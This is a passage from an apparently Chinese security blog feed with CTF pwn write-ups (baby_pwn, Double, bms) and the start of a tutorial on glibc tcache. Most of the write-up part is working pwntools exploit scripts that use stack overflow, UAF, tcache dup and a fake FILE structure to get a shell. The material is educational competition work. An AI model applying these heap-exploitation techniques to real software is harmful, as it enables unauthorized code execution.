class="string">'daily:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'daily\n'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'daily:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> pidof(p)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 leak libc&amp;heap base</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'\x00'</span> * <span class="number">0x5f</span>)</span><br><span class="line">debug()</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">''</span>)</span><br><span class="line">libc.address = u64(show().split(<span class="string">'1 : '</span>)[<span class="number">1</span>][:<span class="number">6</span>].ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - <span class="number">0x3c4b0a</span></span><br><span class="line">change(<span class="number">1</span> , <span class="string">'abcdefgh'</span>)</span><br><span class="line">heap_base = u64(show().split(<span class="string">'abcdefgh'</span>)[<span class="number">1</span>].split(<span class="string">'2 :'</span>)[<span class="number">0</span>].ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - <span class="number">0x10a</span></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">success(<span class="string">'heap_base =&gt; '</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">'free_hook =&gt; '</span> + hex(free_hook))</span><br><span class="line">success(<span class="string">'system_addr =&gt; '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 clear heap</span></span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step3 free2fastbin</span></span><br><span class="line">add(<span class="number">0x30</span> , <span class="string">'a'</span> * <span class="number">8</span> + p64(heap_base + <span class="number">0x10</span>))<span class="comment">#heap_base + 0x18</span></span><br><span class="line">offset = (heap_base - <span class="number">0x602060</span>) / <span class="number">16</span> + <span class="number">1</span></span><br><span class="line">remove(offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step4 fastbin attack : free_hook =&gt; system</span></span><br><span class="line">add(<span class="number">0x41</span> , <span class="string">'\x00'</span> * <span class="number">0x40</span>)</span><br><span class="line">change(<span class="number">0</span> , p64(<span class="number">0x602068</span>))</span><br><span class="line">add(<span class="number">0x30</span> , <span class="string">'/bin/sh\x00'</span>)<span class="comment">#heap</span></span><br><span class="line">add(<span class="number">0x30</span> , p64(free_hook))<span class="comment">#bss</span></span><br><span class="line">change(<span class="number">1</span> , p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Get Ghell &amp; Have Fun</span></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-baby-pwn"><a href="#0x03-baby-pwn" class="headerlink" title="0x03 baby_pwn"></a>0x03 baby_pwn</h2><ul><li>程序功能</li></ul><p>没啥功能，就让输入个东西。</p><ul><li>漏洞位置</li></ul><p>在<strong>vuln</strong>函数中存在由<strong>read</strong>导致的栈溢出漏洞。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-9832ed3b16a2c38a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="vuln"></p><ul><li>利用思路</li></ul><p>程序为<strong>32</strong>位程序，并且只开了<strong>NX</strong>保护机制。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-09343d8bc0df869b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"><br>由于整个程序中调用函数太少，缺少构造<strong>ROP</strong>必要的函数，因此考虑采用<strong>ret2dl_resolve</strong>来<strong>get shell</strong>。所以用了<strong>roptils</strong></p><ul><li><strong>my-exp</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">fpath = <span class="string">'./pwn'</span></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">rop = ROP(fpath)</span><br><span class="line">addr_bss = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line"></span><br><span class="line">buf = rop.retfill(offset)</span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, addr_bss, <span class="number">100</span>)</span><br><span class="line">buf += rop.dl_resolve_call(addr_bss+<span class="number">20</span>, addr_bss)</span><br><span class="line"></span><br><span class="line">p = Proc(rop.fpath)</span><br><span class="line">p.write(p32(len(buf)) + buf)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] read: %r"</span> % p.read(len(buf))</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line">buf += rop.dl_resolve_data(addr_bss+<span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line"></span><br><span class="line">p.write(buf)</span><br><span class="line">p.interact(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-Double"><a href="#0x04-Double" class="headerlink" title="0x04 Double"></a>0x04 Double</h2><ul><li>程序功能</li></ul><p>一个管理输入<strong>data</strong>的<strong>note</strong>式程序，含有增删查改功能，并且每次<strong>data</strong>由一个大小为<strong>0x18</strong>的结构体管理，该结构体数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Header</span>&#123;</span></span><br><span class="line">    __int32 index;</span><br><span class="line">    __int32 length;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">    Header* next_Header;</span><br><span class="line">&#125;Header;</span><br></pre></td></tr></table></figure><ul><li>漏洞位置</li></ul><p>在增加数据时，如果前后两次输入的<strong>data</strong>完全一样时，会导致两个<strong>Header</strong>的<strong>content_ptr</strong>指向同一个地址，很容易造成<strong>UAF</strong>漏洞。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-5fa5c4ad57ea3844.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="add_data"></p><ul><li>利用思路</li></ul><p>对于一道堆题来说几乎没有开什么保护机制。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-9bb49cc235d2222d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"><br>由于<strong>got</strong>表可写，于是考虑最终将<strong>free_got</strong>修改为<strong>system()</strong>地址来<strong>get shell</strong>。<br>第一步，准备通过两个<strong>Header</strong>指向一个<strong>unsort bin</strong>大小的<strong>data</strong>来<strong>leak libc</strong>基址。<br>第二步，构造出一个<strong>0x18</strong>大小的堆块既是<strong>Header</strong>又是<strong>data</strong>的布局。<br>第三步，利用<strong>Header2</strong>来修改<strong>Header3</strong>中的<strong>data</strong>字段，再通过编辑<strong>Header3</strong>的<strong>data</strong>达到任意地址写的目的，这里选择将<strong>free_got</strong>修改为<strong>system()</strong>。<br>第四步，通过<strong>free</strong>之前布置好的<strong>data</strong>为<strong>‘/bin/sh\x00’</strong>的对应<strong>Header</strong>来<strong>get shell</strong>。<br>堆布局大概如下图所示。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-d34e52f245996baa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="堆布局"></p><ul><li><strong>my-exp</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com'</span> , <span class="number">40002</span>)<span class="comment">#nc e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com 40002</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'data:\n'</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">'\n----'</span>)[:<span class="number">-5</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index , data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 leak libc_base</span></span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">0x17</span>)         <span class="comment">#0</span></span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">0x17</span>)         <span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">0x7f</span>)         <span class="comment">#2</span></span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">0x7f</span>)         <span class="comment">#3</span></span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>)      <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">libc.address = u64(show(<span class="number">3</span>).ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">success(<span class="string">'system_addr =&gt; '</span> + hex(system_addr))</span><br><span class="line">success(<span class="string">'free_got =&gt; '</span> + hex(free_got))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 use UAF to change free_got to system_addr</span></span><br><span class="line">fake_header = p32(<span class="number">0x3</span>) + p32(<span class="number">0x7f</span>)</span><br><span class="line">payload = fake_header + p64(free_got)</span><br><span class="line">edit(<span class="number">1</span> , payload)</span><br><span class="line">edit(<span class="number">3</span> , p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Get Shell &amp; Have Fun</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x05-bms"><a href="#0x05-bms" class="headerlink" title="0x05 bms"></a>0x05 bms</h2><p>听说远程是<strong>Tcache</strong><br><strong>……</strong>最近恶补了<strong>Tcache</strong>机制以及<strong>FILE</strong>结构体后来看这道题就很容易了。</p><ul><li>程序功能</li></ul><p>进入输入管理员的密码后，是一个菜单类型的题目，管理了一个<strong>book</strong>的结构体，该结构体数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Book</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>[<span class="number">0x10</span>] BookName;</span><br><span class="line">    <span class="keyword">char</span>* description;</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该结构体的大小为<strong>0x20</strong>字节，有<strong>add</strong>和<strong>delete</strong>两个操作，程序有限制最多<strong>add10</strong>本书，<strong>description</strong>的大小最大不超过<strong>0xFF</strong>字节。</p><ul><li>漏洞位置</li></ul><p>由于这道题当时没有给<strong>libc</strong>版本，默认为<strong>2.23</strong>来看好像没有什么漏洞，后来得知远程是<strong>2.26</strong>的版本，那就很有问题了：在进行<strong>delete</strong>操作时，并没有检查其<strong>description</strong>指向的堆块是否已经处于<strong>free</strong>的状态。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-67d35db7ff7feb40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="delete"><br>在<strong>2.23</strong>版本时会直接报<strong>double free</strong>的错误，无法利用；而在<strong>2.26</strong>版本中则可利用<strong>tcache dup</strong>的方法。</p><ul><li>利用思路</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8447551-ff27fde749585f9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"><br>这道题目除了<strong>PIE</strong>外其余保护机制全开，且本题目没有任何输入功能，没有很明显的<strong>leak</strong>地址的地方，因此考虑用<strong>FILE</strong>结构体的任意写来达到<strong>leak</strong>地址的目的，利用思路大概如下：<br>首先，肯定是要通过逆向的到管理员密码……<br>第二步，利用<strong>delete</strong>功能中未检查是否<strong>free</strong>的漏洞构造<strong>tcache dup</strong>；<br>第三步，修改下一个<strong>tcache</strong>的地址为<strong>stdout</strong>，再<strong>add</strong>将其作为<strong>description</strong>指针申请回去；<br>第四步，就是在<strong>description</strong>中伪造<strong>fake_FILE</strong>，顺理成章地<strong>leak</strong>出<strong>libc</strong>基址。<br>最后，就是故技重施<strong>tcache dup</strong>，修改<strong>free_hook</strong>为<strong>system</strong>，然后<strong>free</strong>掉<strong>/bin/sh\x00</strong>的<strong>description</strong></p><ul><li><strong>my-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'time is up'</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc-2.27.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'username:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'admin'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'password:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'frame'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name , length , description)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'book name:'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">    p.send(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">    sd(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 use FILE structure to leak libc</span></span><br><span class="line">add(<span class="string">'0'</span> , <span class="number">0x50</span> , <span class="string">'0'</span>)</span><br><span class="line"><span class="comment">#tcache dup</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">stdout_addr = got(<span class="string">'stdout'</span>)</span><br><span class="line">add(<span class="string">'1'</span> , <span class="number">0x50</span> , p64(stdout_addr))</span><br><span class="line">add(<span class="string">'2'</span> , <span class="number">0x50</span> , <span class="string">'2'</span>)</span><br><span class="line">add(<span class="string">'3'</span> , <span class="number">0x50</span> , <span class="string">'\x60'</span>)                            <span class="comment">#stdout</span></span><br><span class="line"><span class="comment">#fake _IO_2_1_stdout</span></span><br><span class="line">payload = p64(<span class="number">0xfbad1800</span>) +  p64(<span class="number">0</span>)  +   p64(<span class="number">0</span>)   +   p64(<span class="number">0</span>)     + p64(stdout_addr) + p64(stdout_addr + <span class="number">8</span>) + p64(stdout_addr + <span class="number">8</span>)</span><br><span class="line"><span class="comment">#          _flags           read_ptr    read_end    read_base        write_base           write_ptr                 write_end</span></span><br><span class="line">add(<span class="string">'4'</span> , <span class="number">0x50</span> , payload)                       <span class="comment">#_IO_2_1_stdout</span></span><br><span class="line">libc.address = u64(ru(<span class="string">'done!'</span>)[:<span class="number">-5</span>].ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - <span class="number">0x3ec760</span></span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">success(<span class="string">'free_hook =&gt; '</span> + hex(free_hook))</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">suucess(<span class="string">'system_addr =&gt; '</span> + hex(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 overwrite __free_hook with system</span></span><br><span class="line">add(<span class="string">'5'</span> , <span class="number">0x40</span> , <span class="string">'5'</span>)</span><br><span class="line"><span class="comment">#tcache dup</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="string">'6'</span> , <span class="number">0x40</span> , p64(free_hook))</span><br><span class="line">add(<span class="string">'7'</span> , <span class="number">0x40</span> , <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="string">'8'</span> , <span class="number">0x40</span> , p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Get Shell &amp; Have Fun</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x06-Virtual"><a href="#0x06-Virtual" class="headerlink" title="#0x06 Virtual"></a>#0x06 Virtual</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache机制及漏洞利用方法</title>
      <link href="/2020/03/12/Tcache%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2020/03/12/Tcache%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p><strong>Tcache</strong>机制是在<strong>libc-2.26</strong>中引入的一个新的堆管理机制。掐指一算，<strong>libc-2.26</strong>发布距今应该也有一两年了。由于各种不可控因素，到近期才将其提上日程。</p><a id="more"></a><h2 id="0x01-What’s-New"><a href="#0x01-What’s-New" class="headerlink" title="0x01 What’s New"></a>0x01 What’s New</h2><p>首先得介绍在<strong>libc-2.26</strong>中新引进的<strong>tcache_perthread_struct</strong>和<strong>tcache_entry</strong>两个结构体。</p><ul><li><strong>tcache_perthread_struct</strong><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TCACHE_MAX_BINS 64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125;tcache_perthread_struct;</span><br></pre></td></tr></table></figure></li><li><strong>tcache_entry</strong><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;tcache_entry;</span><br></pre></td></tr></table></figure>从源码中不难看出，<strong>tcache_perthread_struct</strong>在<strong>Tcache</strong>机制中起管理作用，在默认情况下，<strong>sizeof(tcache_perthread_struct) == 0x240</strong>，即可以对低于<strong>0x400</strong>大小的堆块进行管理。其中<strong>tcache_pthread_struct.counts[i]</strong>在<strong>64bit</strong>系统中对应大小为<strong>8 * i</strong>堆块的<strong>Tcachebin</strong>的数量，最大可为<strong>7</strong>。<strong>tcache_pthread_struct.tcache_entry[i]</strong>则指向该大小对应的第一个<strong>Tcachebin</strong>的<strong>fd</strong>的位置。</li></ul><blockquote><ul><li><strong>举个栗子</strong><br>为对这两个结构体有直观的印象，下面的例子中释放了<strong>2</strong>个大小为<strong>0x20</strong>、<strong>1</strong>个大小为<strong>0x20</strong>的堆块。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-c5b7dd5c16ef4f69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="堆块分布"><br>其中第一个<strong>0x250</strong>的堆块是在第一次申请内存时，会分配一个空间用于存放<strong>tcache_pthread_struct(0x240 + **堆头</strong> == 0x250)<strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-3e44bdfd8bb423a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="tcache_pthread_struct"><br>上图中则展示了第一个堆块，即</strong>tcache_perthread_struct<strong>中存放的数据。<br>图中红色方框内的数据，即对应结构体中的</strong>count<strong>，共</strong>0x40<strong>字节，每字节对应相应大小</strong>Tcachebin<strong>中的个数。如绿色方框中对应</strong>size<strong>为</strong>0x20<strong>大小的</strong>Tcachebin<strong>中有</strong>2<strong>个空闲堆块，而黄色方框中则对应</strong>size<strong>为</strong>0x30<strong>大小的</strong>Tcachebin<strong>中有</strong>1<strong>个空闲堆块。<br>图中蓝色方框内的数据，即对应结构体中的</strong>tcache_entry<strong>，共</strong>0x200<strong>字节</strong>(0x40 * 8 == 0x200)<strong>，每一个指针对应相应大小</strong>Tcachebin<strong>中第一个堆块的入口地址。如绿色箭头对应</strong>size<strong>为</strong>0x20<strong>大小的</strong>Tcachebin<strong>的入口地址，二黄色箭头则对应</strong>size<strong>为</strong>0x30<strong>大小的</strong>Tcachebin**的入口地址。</li></ul></blockquote><h2 id="0x02-What’s-Tcachebin"><a href="#0x02-What’s-Tcachebin" class="headerlink" title="0x02 What’s Tcachebin"></a>0x02 What’s 